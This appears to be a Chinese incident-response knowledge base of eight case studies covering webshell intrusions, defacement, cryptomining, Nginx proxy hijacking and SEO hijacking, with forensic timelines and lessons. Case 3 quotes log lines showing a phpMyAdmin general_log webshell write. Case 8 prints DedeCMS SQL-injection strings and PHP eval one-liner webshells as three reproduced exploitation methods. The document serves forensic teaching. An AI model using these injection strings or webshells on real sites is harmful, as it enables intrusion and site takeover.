## 案例 1：后台上传点被篡改 —— 六条线索串联

**背景**：2018-11-29 04:47，某网站管理员发现**后台登录页面被篡改**。服务器 Windows，应用 Java，中间件 Tomcat。

### 处置过程

**① Webshell 排查**
用 D盾扫网站目录 → 发现 Webshell 痕迹 → 查看文件内容确认。
文件位置：网站 root 根目录 `\root\indexweb4.jsp`
**创建时间：2018-11-23 05:55**

**② Web 日志分析 —— 遇到硬障碍**

> 查看 Tomcat 的 `server.xml`，发现其中的**日志配置项被注释**，即**未启用日志**，
> 因此**完全没有 Web 日志记录**。

**③ 系统排查**

- 人工排查后台：系统对互联网开放，且**管理员与其他角色用户均使用相同弱密码 `asd123`**
- 系统显示攻击者在 2018-11-29 04:47 左右**通过网站管理后台篡改了登录界面 Logo**
- Tomcat 中间件使用弱密码 **`tomcat`** → 攻击者可以轻易登录 **probe 监控系统**

**④ 安全软件告警追溯**

查看服务器上的安全软件告警 → 发现**多次恶意进程执行记录**，并**请求恶意域名下载恶意程序**。
**最早在 2018-11-23 00:44，该恶意程序就已在服务器上运行。**

**⑤ 逆向分析样本**

逆向病毒文件 → 可基本确定其对应**挖矿木马**特征 → 攻击者不仅篡改网页，同时植入挖矿程序。

**⑥ 系统日志分析**

事件查看器筛安全日志（`security.evtx`）→ **36979 条审核记录**。
分析登录日志：**自 2018-11-02 起至网页篡改发现时**，存在**大量 RDP 远程桌面暴力破解**与
**IPC 暴力破解**攻击行为，且存在多个异常 RDP 登录记录。

源 IP：`125.68.10.14`（四川德阳）、`104.222.32.79`（美国）、`77.77.98.81`（伊朗）

### ⭐ 问题总结（六条线索）

```
（1）服务器于 2018-11-23 被上传了 Webshell 网页木马文件
（2）Web 应用后台存在弱密码
（3）中间件后台存在弱密码
（4）服务器未开启 Web 日志记录功能
（5）服务器于 2018-11-23 就存在挖矿木马的恶意程序
（6）服务器于 2018-11-02 就被 RDP 暴力破解并被远程登录
```

**推理**：页面是通过**后台上传功能**篡改的 → 推测攻击者在 2018-11-29 通过**后台弱密码**
登录系统并执行了篡改 Logo 操作。**但此前系统已经被入侵控制**，甚至在 2018-11-02
就已经被 RDP 暴力破解并远程登录。

> ⚠️ **真正的入侵时间远早于"现象出现时间"。** 由于服务器未开启 Web 日志且漏洞较多，**溯源定位困难**。

### 根除及恢复

```
① 暂停相关业务服务，移除遗留 Webshell 和攻击者工具
② 对服务器启用的服务安全加固，关闭不用的端口和服务，减小攻击面
③ 后续应开启 Web 访问日志记录（本次因未开启而溯源困难）
④ 避免使用弱密码，定期病毒查杀
```

### 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐ **多个弱密码叠加** | 后台 `asd123` + Tomcat `tomcat` —— **任一入口都能进** |
| ⭐ **查安全软件历史告警** | 它给出的"最早恶意进程时间"（11-23 00:44）**比 Webshell 创建时间更早**，是还原真实时间线的关键 |
| ⭐ **RDP 爆破也是入口** | 不要只盯着 Web。11-02 的 RDP 爆破成功才是更早的入侵 |
| **现象时间 ≠ 入侵时间** | 篡改发生在 11-29，但入侵从 11-02 就开始了 |

**涉及文档**：`events/webshell.md`、`../40-log-analysis.md`

## 案例 2：Linux 服务器被植入 Webshell —— 跨主机跳板溯源

**背景**：2018-07-23，某公司**流量监测设备告警**，提示存在 Webshell 连接。
目标服务器 Linux，Web 应用 Java。

### ⭐ 处置过程（这是本书里最好的溯源范例）

**① Webshell 排查**
通过告警定位到告警文件 → 查看文件内容 → 确认为 Webshell 后门。

**② Web 日志排查 —— 关键判断**

```
通过日志排查发现最早访问该 Webshell 的时间：
    2018-07-23 14:16:56

但在对相关 Web 流量日志的前后项进行过滤后，
并未发现异常的文件上传行为
    ⇒ 初步排除"通过 Web 途径"对系统进行攻击
```

> ⭐ **这一步是全案转折点**：Web 日志否掉了 Web 上传路径，**于是不得不转向别处**。

**③ 转向系统日志 —— 找到更早的可疑登录**

```
在 SSH 登录日志中，Webshell 首次访问的相邻时间段内，
存在来自 10.127.2.2 的可疑登录记录：
    2018-07-23 14:08
```

⭐ **时间对比**：Webshell 首次被访问是 **14:16:56**，而可疑 SSH 登录是 **14:08** —— **登录早 8 分钟**。

**④ 文件排查**

与运维人员沟通 → 确认**运维人员在该时间段内并未使用该 IP 地址登录服务器**。
检索该 IP 登录时间内产生的相关文件 → 在**临时目录**中发现 **Nmap 扫描日志 `/tmp/1.xml`**。

**⑤ ⭐ 转向上游主机排查**

排查主机 `10.127.2.2` → 发现该主机**部署禅道管理系统并对公网提供访问**。
系统进程排查 → 发现可疑进程 `a` → **尝试主动连接至远程主机 `123.59.118.220`**
进程启动时间：2018-07-23 14:39

继续检索该进程文件 → **发现对应路径文件已被删除** → ⭐ **通过复制文件内存副本**发现该进程
实际上是 **Termite（白蚁）远程控制工具**。

排查该主机系统文件 → 在 `/storage/www/html/zentaopms/www/` 目录下存在
**Webshell 后门文件 `help123.php`**。

检索该文件的 Web 流量日志：

```
2018-07-20 15:09:02   来自 121.205.7.237 的可疑访问记录
```

进一步分析该服务器 Web 日志 → **发现该 IP 地址登录后台并上传 Webshell 的记录**。

> ⚠️ 由于**该服务器更换过 IP 地址**，因此流量设备并未记录到该服务器流量。

**⑥ 攻击链还原**

```
攻击者先登录禅道管理系统后台
  → 通过系统文件管理功能，向 10.127.2.2 上传 Webshell 后门
  → 并植入远程控制程序（Termite/白蚁）
  → 以此服务器为跳板主机
  → 通过 SSH 管理服务，使用 root 用户登录到"中招"目标服务器
  → 向目标服务器植入 Webshell 后门
  → 并对内网其他主机进行扫描探测
```

### 问题总结（四条线索）

```
（1）2018-07-23 14:16:56  目标服务器发现存在 Webshell 访问
（2）2018-07-23 14:08     目标服务器出现来自 10.127.2.2 的异常 SSH 登录
（3）服务器 10.127.2.2 中存在远控程序，远控 IP 为 123.59.118.220，
     且 2018-07-20 15:18:01 发现 Webshell 文件 help123.php
（4）从 10.127.2.2 的日志中发现，121.205.7.237 在 2018-07-20 15:09:02
     从后台上传 help123.php
```

**结论**：
- **攻击 IP** = `121.205.7.237`
- **远控 IP** = `123.59.118.220`

### 根除及恢复

```
① 服务器断网，清理 Webshell 及恶意程序
② 服务器加固，更改应用及系统密码，升级禅道管理系统，修补漏洞
③ 清理完成确认安全后，重新部署上线
```

### ⭐ 可复用的招数（本案例是全书精华）

| 招数 | 说明 |
|---|---|
| ⭐⭐ **Web 日志排除法** | 前后项过滤后**没有上传行为** → 果断排除 Web 路径，**转向系统日志**。不要在没有上传记录时继续死磕 Web |
| ⭐⭐ **时间差对比** | Webshell 访问 14:16:56 vs SSH 登录 14:08 → **登录早 8 分钟** = 强因果信号 |
| ⭐⭐ **问运维** | "运维确认没用过这个 IP" —— **一句话把正常登录排除掉** |
| ⭐ **同时间段文件检索** | 在登录时间窗内找文件 → 发现 `/tmp/1.xml`（Nmap 日志）= 攻击者在扫内网 |
| ⭐ **文件被删 → 复制内存副本** | `/proc/<PID>/exe` 捞出 Termite 远控 |
| ⭐⭐ **向上游跳板溯源** | 从被入侵主机 → 找到跳板机 → 在跳板机上找到**更早的入口**（禅道后台）→ 找到**真实攻击 IP** |
| ⭐ **换过 IP 的设备会漏日志** | 流量设备没记录到该服务器流量 —— **日志缺失也要当作线索** |
| **扫描日志是攻击者痕迹** | `/tmp/1.xml` 是 Nmap 输出 → 说明攻击者在做内网探测 |

**涉及文档**：`events/webshell.md`、`../25-process-service.md`、`../40-log-analysis.md`

## 案例 3：Windows 服务器被植入 Webshell —— 数据库写马

**背景**：2019-12-26，某单位**被上级监管单位通报存在挂马现象**，网站应用存在可疑 Webshell 访问。
服务器 Windows，使用 PHP 开发。

### 处置过程

**① Webshell 排查**
用 D盾扫描网站目录 → 发现 Webshell 痕迹。

**② ⭐ Web 日志分析 —— 完整攻击链（含日志原文）**

```
2019-05-26
  攻击者通过管理后台访问到编辑器，
  并且成功上传带有恶意 Webshell 代码的图片文件
  ⚠️ 但未成功入侵（图片马没被解析）

2019-06-14 09:22:37
  202.***.***.10 - - "GET /test/l.php HTTP/1.0" 200 14820
  ⭐ 攻击者通过目录猜解工具成功猜解到网站部署的探针文件

2019-06-14 09:22:48
  "POST /phpmyadmin/index.php HTTP/1.0" 302
  ⭐ 成功登录 phpmyadmin 管理后台

2019-06-14 09:23:41
  "GET /phpmyadmin/server_variables.php?token=1ac7aa7b...&ajax_request=true
       &type=getval&varName=general_log_file&_nocache=... HTTP/1.0" 200 58
  ⭐ 读取 MySQL 的 general_log_file 路径

2019-06-14 09:24:03
  "GET /phpmyadmin/server_variables.php?token=1ac7aa7b...&ajax_request=true
       &type=setval&varName=general_log_file
       &varValue=C%3A%2Fphpstudy_v8.0%2FWWW%2F520.php&_nocache=... HTTP/1.0" 200 61
  ⭐⭐ 把 general_log 指向 web 目录下的 520.php
      ⇒ 之后任何写入 general_log 的 SQL 都会落到 520.php —— 这就是写马

2019-06-14 09:24:33
  "POST /c321.php HTTP/1.0" 200 22176
  ⭐ 访问 520.php 落地后，用它又写了一个后门 c321.php（后门写后门）

2019-06-16 04:02:08
  "GET /C:/phpstudy_v8.0/WWW/include/plugin/bankpay/lib/mow4125ang.php HTTP/1.0" 403 271
  ⭐ 用【绝对路径】访问 —— 403 本身也是线索

2019-06-16 20:40:51
  "POST /include/smarty/plugins/function.cycle.php HTTP/1.0" 200 173
  ⭐⭐ 修改系统模板文件生成新后门，伪装成 Smarty 插件
```

**③ 系统排查**

> **系统排查无异常，攻击者仅上传了 Webshell 操作。**

**④ 问题总结**

```
（1）2019-05-26，攻击者成功上传带有恶意代码的图片，但未成功入侵
（2）2019-06-14，攻击者通过 phpmyadmin 管理后台成功登录，
     通过操作数据库成功向服务器写入后门文件，获取服务器控制权限
```

### 根除及恢复

```
① 对被入侵的服务器进行下线处理
② 清除攻击者上传成功的恶意代码和后门文件
③ 对 Web 应用进行补丁升级和漏洞修复
④ 加强登录密码复杂度，并添加登录验证措施
⑤ 通过网络安全设备对网站进行防护
```

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **MySQL `general_log_file` 被改 = 写马** | **不依赖上传漏洞**。看到 `varName=general_log_file` + `varValue=...php` 就是铁证 |
| ⭐ **403 也是线索** | 攻击者用绝对路径 `C:/phpstudy_v8.0/WWW/...` 访问，说明他知道物理路径 |
| ⭐⭐ **伪装成框架文件** | `function.cycle.php` 看似 Smarty 插件，**只能靠文件完整性校验发现** |
| **图片马可能失败** | 5-26 上传了图片马但没成功，攻击者**一个月后才换路子** —— 同类痕迹要区分"成功/失败" |
| ⭐ **探针文件 `l.php` 是弱点** | 目录猜解到探针 = 泄露环境信息 |
| **系统排查无异常就收手** | 本案例只有 Webshell，**没有系统级后门**。不要硬找 |

**涉及文档**：`events/webshell.md`、`../30-file-artifacts.md`、`../40-log-analysis.md`

## 案例 4：首页图片被篡改 —— 潜藏一年的 Webshell

**背景**：网站首页被恶意篡改（复制原图 PS 后替换）。

### 处置过程 —— ⭐ 教科书级时间线推演

**① 确认篡改时间**
查看被篡改的图片 → **篡改时间 2018-04-18 19:24:07**

**② 访问日志溯源**
通过图片修改的时间节点 → 发现可疑 IP `113.xx.xx.24`（代理 IP，无法追溯真实来源）
该 IP **访问了 `image.jsp`（脚本木马）**，并**随后访问了被篡改的图片地址**。

**③ ⭐ 全量日志审查（关键一步）**

日志保存时间范围：**2017-04-20 至 2018-04-19**（约一年）

发现 **`image.jsp` 一共只有两次访问记录**：

```
2018-04-18    ← 篡改当天
2017-09-21    ← 一年前
```

⇒ 推断 **`image.jsp` 在 2017-09-21 之前就已经上传到网站服务器**，
**已经潜藏长达半年多甚至更久**。

**④ 寻找真相**

在网站根目录找到了答案：**站点目录下存在 `ROOT.rar` 全站源码备份文件**，
备份时间 2017-02-28 10:35。

解压 `ROOT.rar` → ⭐ **源码中存在的脚本木马与网站访问日志的可疑文件名一致（`image.jsp`）**。

**⑤ 无法确定的原始入口**

尝试还原攻击路径，但在访问日志中**并未找到 `ROOT.rar` 的访问下载记录**
（日志只保留近一年，而这个 webshell 可能已存在多年）。

> 原文反思：*"本文的示例中攻击者为我们留下了大量的证据和记录，而更多时候，
> 攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。"*

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **访问次数极少的脚本 = 长期潜藏的马** | 一年只被访问两次。**统计每个脚本的访问次数**能筛出这种"静默后门" |
| ⭐⭐ **查站点根目录的备份包** | `ROOT.rar` / `www.zip` / `.git` —— 既是**证据源**（含更早的马），也可能是**入侵途径** |
| ⭐ **代理 IP 要标注"无法追溯"** | `113.xx.xx.24` 是代理，**不要当成真实攻击者** |
| **日志保留期不足** | 只能给出时间的**下界**（"该马在 2017-09-21 之前就已存在"），**必须明确说明** |
| ⭐ **图片篡改看时间戳** | 图片的 `Modify` 时间 = 篡改时间，是整条时间线的锚点 |

**涉及文档**：`events/web-defacement.md`、`../40-log-analysis.md`、`../30-file-artifacts.md`

## 案例 5：批量挂黑页 —— 删了文件还能访问

**背景**：采用开源 CMS 建站，某天发现**友情链接模块被挂大量垃圾链接**，
网站出现很多不该有的目录，里面全是博彩相关的网页。
攻击者还会在小论坛注册马甲把黑页链接发到论坛**引爬虫收录**。

**现象**：

```
http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html
http://www.xxx.com/upload/aomendduchangzaixian/index.html
http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html
```

⭐ **链接可以访问，直接访问物理路径也可以看到文件，但打开网站目录并没有发现这些文件。**

### 原因分析

网站存在高危漏洞，常见于一些存在安全漏洞的开源 CMS，利用 0day 批量拿站上传黑页。

### 问题处理

```
① 文件夹选项 → 取消"隐藏受保护的操作系统文件"勾选，
   选"显示隐藏的文件、文件夹和驱动器"
② 复查 → 看到【半透明的隐藏文件夹】→ 清除隐藏文件夹及所有页面
③ ⭐ 清除 IIS 临时压缩文件：
   C:\inetpub\temp\IIS Temporary Compressed Files\WEBUI\$^_gzip_D^\WEB\WEBUI\UPLOAD
④ 投诉快照，申请删除相关的网页收录，减少影响
```

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **"文件删了链接还能访问" → 找缓存** | **IIS 临时压缩缓存**是本次的关键。同类还有 Nginx `proxy_cache`、CDN 缓存 |
| ⭐ **隐藏文件夹** | Windows 的 `attrib +h`，Linux 的 `.` 开头目录。**`dir` / `ls -l` 看不到，必须 `/a` / `-al`** |
| **黑帽 SEO 的完整链条** | 挂黑页 → 论坛发外链 → 引爬虫收录 → 搜索引擎出现博彩结果 |

**涉及文档**：`events/web-defacement.md`

## 案例 6：新闻源网站劫持 —— Nginx 配置被改

**背景**：某新闻源网站**首页广告链接被劫持**到博彩网站。
三个广告专题链接：

```
http://www.xxx.cn/zhuanti/yyysc/index.shtml
http://www.xxx.cn/zhuanti/wwwsc/index.shtml
http://www.xxx.cn/zhuanti/zzzsc/index.shtml
```

### 处置过程

```
① 抓包分析 → 发现返回页面已被劫持，加载了第三方 JS
   http://xn--dpqw2zokj.com/N/js/dt.js
② dt.js 进一步加载另一条 JS
   http://xn--dpqw2zokj.com/N/js/yz.js
③ 最终跳转 https://lemcoo.com/?dt → 博彩链接导航网站
   （访问后会随机跳转到第三方赌博网站）

④ ⭐ 找 url 对应的文件位置 —— 即使文件被删除，链接依然可以访问
   ⇒ 说明不是文件层面的问题
⑤ 发现三条链接都以 "sc" 后缀结尾
⑥ ⭐ 排查 Nginx 配置文件 → 发现 VirtualHost.conf 被篡改
   通过反向代理匹配以 "sc" 后缀的专题链接，劫持到 http://103.233.248.163
⑦ 删除恶意代理后，专题链接访问恢复
```

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **"删了文件仍可访问" + "URL 有共同特征" → 查中间件配置** | 不是缓存就是**反代规则**。看 `proxy_pass` / `rewrite` |
| ⭐ **抓包看 JS 加载链** | `dt.js` → `yz.js` → 跳转，**逐层跟** |
| **劫持可以有针对性** | 只匹配特定后缀（`sc`）的 URL，**正常访问完全看不出问题** |
| **配置文件要查 mtime** | `ls -lat /etc/nginx/` 找最近被改的配置 |

**涉及文档**：`events/web-defacement.md`

## 案例 7：搜索引擎劫持 —— 隐藏目录 include

**背景**：**直接打开网址访问网站是正常的**，但**从搜索引擎结果页中打开**会跳转到
博彩、虚假广告、淘宝搜索页等。

### 处置过程

```
① 对 index.php 文件进行代码分析
   → 发现该文件代码对来自【搜狗和好搜】的访问进行流量劫持
② ⭐ 跟着 include 函数包含的文件
   → index.php 包含 /tmp/.ICE-unix/../c.jpg
③ 进入 /tmp 目录查看
   → 发现该目录下如 c.jpg 等文件，包含着一套博彩劫持的程序
```

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **`include` 目标后缀不是 `.php`** | 这里是 `.jpg` —— **极强可疑信号** |
| ⭐⭐ **路径含 `/tmp/` 和 `.` 开头隐藏目录** | `.ICE-unix` 是 Linux `/tmp` 下**默认存在**的目录（还有 `.Test-unix`、`.X11-unix`、`.XIM-unix`）—— **攻击者利用它的隐藏属性**（`ls -l` 看不到） |
| ⭐ **按 Referer/UA 判断劫持** | 对搜狗/好搜来的流量才劫持，**直接访问看不出问题** |
| **代码审计找祸根** | 从 `index.php` 入手，顺 `include` 往下追 |

**涉及文档**：`events/web-defacement.md`、`../30-file-artifacts.md`

## 案例 8：管理员账号被篡改 —— 落库型 Webshell

**背景**：你是某网站管理员，某天**管理员账号 `admin` 登录不了**。
进数据库看，**用户名不存在了，却多了另外一个管理员用户名** —— 不是新增，而是**被篡改了**。
前后端分离，**后台只允许内网访问**，但 `admin` 账户**依然被多次篡改**。

### 问题处理

**① 网站 Webshell**

对网站根目录扫描 → 发现脚本木马，**创建时间 2018-06-13 04:30:30**

**② 定位 IP**
通过木马创建时间，查看网站访问日志 → **定位到 IP `180.xx.xx.3`**

**③ ⭐ 关联分析**

全局搜索与该 IP 有关的操作日志 → 在脚本木马**生成前**，有两条可疑访问日志：

```
172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800]
  "GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&...&arrs2[]=99&... HTTP/1.1" 200 67

172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800]
  "GET /plus/ad_js.php?aid=19 HTTP/1.1" 200 32
```

对这段 POC 解码，发现**通过这个 POC 可以往数据库中插入数据**，
进一步访问 `/plus/ad_js.php?aid=19` 即可**在 plus 目录生成 `read.php` 脚本文件**。

**解码后**：

```sql
cfg_dbprefixmyad SET `normbody` = '<?php file_put_contents(''read.php'',
    ''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE `aid` =19 #
```

⇒ 推测 `/plus/download.php` 中存在 **SQL 注入漏洞**。

**④ 漏洞复现（三种利用方式）**

**方式一：修改后台管理员**

```
① 新建管理员账号 test/test123789，可成功登录后台
② 构造注入 SQL：
   cfg_dbprefixadmin SETuserid='spider',pwd='f297a57a5a743894a0e4' where id=19 #
   ⇒ 后台管理员变为：用户名 spider，密码 admin
③ 执行 EXP 后登录用户变为 spider/admin
```

**方式二：通过 `/plus/mytag_js.php` 生成一句话木马**

```sql
cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\',
  '{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\'`
```

→ 向 `dede_mytag` 表插入记录 → 访问 `/plus/mytag_js.php?aid=9013` → **生成 `90sec.php` 一句话木马**

**方式三：让 `/plus/ad_js.php` 本身变成一句话木马**

```sql
cfg_dbprefixmyad SETnormbody= '<?php file_put_contents(''read.php'',
    ''<?php eval($_POST[x]);echo mOon;?>'');?>' WHEREaid =19 #
```

→ 向 `dede_myad` 表插入记录 → 访问 `/plus/ad_js.php?aid=19` → **在 plus 目录生成 `read.php`**

**⑤ ⭐ 如何清除**

```
1、删除网站目录中的 webshell
2、⭐ 清除 dede_myad、dede_mytag 数据库表中插入的 SQL 语句，
   防止再次被调用生成 webshell
```

**⑥ 如何防御**
网站采用开源 CMS 搭建，**建议及时对官方发布的系统补丁以及内核版本进行升级**。

### ⭐ 可复用的招数

| 招数 | 说明 |
|---|---|
| ⭐⭐ **Webshell 可以从数据库来** | 数据库表里存着"生成代码的 SQL"，**不是上传漏洞** |
| ⭐⭐ **清除必须连数据库一起清** | **只删文件不清库 → 触发点被访问一次，马就回来了** |
| ⭐ **攻击者用数组参数混淆注入** | `arrs1[]=99&arrs1[]=102...` 是十进制 ASCII 码拼接的 SQL —— **看到这种长数组参数要警惕** |
| ⭐ **前后端分离 + 只允许内网访问 ≠ 安全** | 案发环境就是这样，**admin 仍被反复篡改** |
| **开源 CMS 是重灾区** | DeDeCMS / phpCMS 等历史漏洞多，**查 CMS 版本 + 已知漏洞** |
| ⭐ **时间关联** | 木马创建时间（06-13）→ 往前找 06-10 的可疑请求 → 找到注入点 |

**涉及文档**：`events/webshell.md`（含"落库型 Webshell"专节）、`../40-log-analysis.md`

## 横向提取：可以照做的通用套路

### 时间线还原四步

```
① 锚定时间点（文件创建/修改时间、图片篡改时间、勒索信生成时间）
② 圈定该时间窗内的文件变动（find -ctime / forfiles）
③ 去日志里找该时间窗的可疑请求（access log / secure log）
④ 顺着找到的 IP 往前扩（时间窗提前 = 找更早的入侵）
```

### 当一条路走不通时

| 卡在哪 | 转向哪 | 案例 |
|---|---|---|
| Web 日志无上传记录 | ⭐ **系统 SSH 日志** | 案例 2 |
| 没有 Web 日志（被关/被注释） | 安全软件历史告警 + 事件日志 | 案例 1 |
| 文件删了链接还能访问 | ⭐ **缓存 / 中间件配置** | 案例 5、6 |
| 特征库扫不出恶意文件 | ⭐ **文件完整性校验** | 案例 3 |
| 二进制已自删除 | ⭐ **`/proc/<PID>/exe` 复制内存副本** | 案例 2 |
| 找不到原始入口 | 说明**只能给时间下界** + 查备份包 | 案例 4 |

### 最容易丢分的三件事

1. **只删文件不清持久化** → 会被拉回来（cron / 库表记录 / 反代配置）
2. **把现象时间当入侵时间** → 案例 1 差 27 天，案例 4 差半年以上
3. **脑补路径/过度推断** → 报告里的路径必须是观测到的形式（见 `SKILL.md` 路径证据纪律）
